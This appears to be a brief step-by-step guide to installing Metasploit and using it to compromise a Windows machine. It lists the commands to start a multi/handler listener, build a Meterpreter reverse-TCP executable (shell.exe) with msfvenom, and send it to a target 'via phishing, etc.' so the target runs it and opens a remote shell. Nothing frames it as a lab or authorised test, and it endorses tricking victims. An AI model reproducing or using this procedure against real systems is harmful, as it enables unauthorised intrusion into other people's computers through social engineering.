Metasploit installation Procedure.

1. sudo apt update

sudo apt upgrade -y

sudo apt-get install metasploit-framework

2. Start Metasploit

msfconsole

3. Setup Handler (Listener)

- use exploit/multi/handler

- set PAYLOAD windows/meterpreter/reverse_tcp - set LHOST (your IP address)(Attacker IP) - set LPORT (set port) (Listener port, e.g., 4444) - exploit -j (Start listener)

4. Generate Payload (on attacker)

msfvenom -p windows/meterpreter/reverse_tcp LHOST=(your IP address) LPORT=(port set) -f exe > shell.exe "" - shell.exe: Payload for Windows target.

5. Deliver & Execute Payload - Send shell.exe to target (via phishing, etc.). - Get target to run shell.exe.

6. Get Shell - When target runs payload, you'll get a Meterpreter shell on msfconsole.
